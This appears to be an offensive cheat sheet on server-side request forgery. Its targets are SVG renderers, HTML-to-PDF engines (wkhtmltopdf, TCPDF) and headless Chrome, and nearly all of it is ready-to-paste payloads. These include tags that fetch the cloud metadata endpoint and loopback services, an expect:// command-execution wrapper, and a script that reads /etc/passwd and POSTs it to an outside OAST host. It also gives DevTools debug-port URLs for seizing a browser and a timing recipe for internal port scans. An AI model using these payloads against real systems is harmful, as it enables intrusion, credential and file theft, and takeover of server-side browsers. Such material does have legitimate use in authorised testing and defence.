# SVG / HTML-to-PDF / headless-browser SSRF vectors — Open WHEN: the sink renders user-supplied SVG/HTML, exports to PDF/screenshot, or drives a headless browser, and you need concrete fetch tags or a DevTools-port abuse recipe

Body covers the concepts. Below are copy-paste files and the headless-browser
DevTools/inspector abuse details.

## SVG server-side fetch vectors (drop into an uploaded/rendered .svg)
Each external reference is fetched by the renderer server-side. Swap the URL
for an internal target, metadata endpoint, or your OAST host.

```xml
<!-- iframe inside foreignObject (most renderers) -->
<svg width="6000" height="6000"><g><foreignObject width="6000" height="6000">
  <body xmlns="http://www.w3.org/1999/xhtml">
    <iframe src="http://169.254.169.254/latest/meta-data/"></iframe>
  </body></foreignObject></g></svg>
```
```xml
<!-- xlink:href on <image> -->
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="http://127.0.0.1:8080/healthz"></image></svg>
```
```xml
<!-- expect:// wrapper (PHP expect ext on) -> command output as image source -->
<image xlink:href="expect://id"></image>
```
```xml
<!-- CSS @import -->
<svg xmlns="http://www.w3.org/2000/svg"><style>
  @import url(http://169.254.169.254/latest/meta-data/);</style></svg>
```
```xml
<!-- xml-stylesheet processing instruction -->
<?xml-stylesheet href="http://internal/style.css"?>
<svg xmlns="http://www.w3.org/2000/svg"></svg>
```
```xml
<!-- <link> stylesheet / <use> reference -->
<link xmlns="http://www.w3.org/1999/xhtml" rel="stylesheet" href="http://internal/style.css"/>
<use xlink:href="https://internal/file2.svg#foo"/>
```

## HTML-to-PDF renderers (wkhtmltopdf / TCPDF / spipu-html2pdf)
Every `<img>`/`<link>`/`<script>` href in the rendered HTML is a blind
server-side fetch via cURL / `file_get_contents`.
```html
<img width="1" height="1" src="http://127.0.0.1:8080/healthz">
<link rel="stylesheet" href="http://169.254.169.254/latest/meta-data/">
```
- TCPDF 6.10.0 retries each `<img>` several times -> useful for timing-based
  port scan diffs.
- Some PDF engines emit the fetch error (timeout vs connection-refused) into
  the rendered output -> a readable oracle for blind cases.

## Headless-browser exporter — point the page at internal targets
Target form: `chrome --headless --print-to-pdf https://site/yourpage.html`
where you control the page contents or the URL.
```html
<!-- JS redirect to a local file (works if file access is allowed) -->
<script>window.location="file:///etc/passwd"</script>
```
```html
<!-- iframe a local file -->
<iframe src="file:///etc/passwd" height="640" width="640"></iframe>
```
```html
<!-- if launched with --allow-file-access / --disable-web-security:
     read a file then ship it to your OAST host -->
<script>
fetch("file:///etc/passwd").then(r=>r.text())
 .then(t=>fetch("https://<oast-id>.oast.site/",{method:"POST",body:t}));
</script>
```
Insecure launch flags that enable the above (look for them in any /proc cmdline
you can read, or infer from behaviour): `--allow-file-access`,
`--allow-file-access-from-files`, `--disable-web-security`, `--no-sandbox`.

## Exposed DevTools / inspector debug port (SSRF -> full browser control)
Chrome `--remote-debugging-port` (default **9222**); Node `--inspect`
(default **9229**). If SSRF can reach loopback on these ports:
```
http://127.0.0.1:9222/json/version    # leaks browser UUID + webSocketDebuggerUrl
http://127.0.0.1:9222/json/list       # open tabs / targets
http://127.0.0.1:9222/json/new?http://<oast-id>.oast.site/?p=22   # open a tab -> port scan loop
```
`/json/version` sample (the `webSocketDebuggerUrl` is the control channel):
```json
{ "Browser":"Chrome/136...", "webSocketDebuggerUrl":"ws://127.0.0.1:9222/devtools/browser/<uuid>" }
```
Reachable WS debugger = read tabs/cookies/history and navigate the browser.
Notes: since Chrome 136 these switches are ignored on the default data dir
unless paired with `--user-data-dir`; connecting to the WS from a fresh origin
may need the browser to have been started with `--remote-allow-origins="*"`.
Node `--inspect` behaves like the debug port (`node --inspect=0.0.0.0:4444 app.js`).

## Browser-based internal port scan (timing oracle)
Insert `<img src="http://<internal-host>:<port>/">` and measure time to the
`onerror` event. Calibrate against a known-closed port (average ~10 trials);
if `time_to_error(target) > time_to_error(closed)*1.3` the port is likely open.
Chrome blocks a list of "known" ports and blocks local-network addresses
except `localhost`/`0.0.0.0` — scan those, or use the DevTools `/json/new`
loop above instead.

## CVE angle (headless engine itself)
Fingerprint the engine from its `User-Agent` (`HeadlessChrome/<ver>`), then a
known V8/Blink/WebKit n-day in a rendered page can escalate render-an-HTML to
code execution in the renderer — especially when launched `--no-sandbox`.
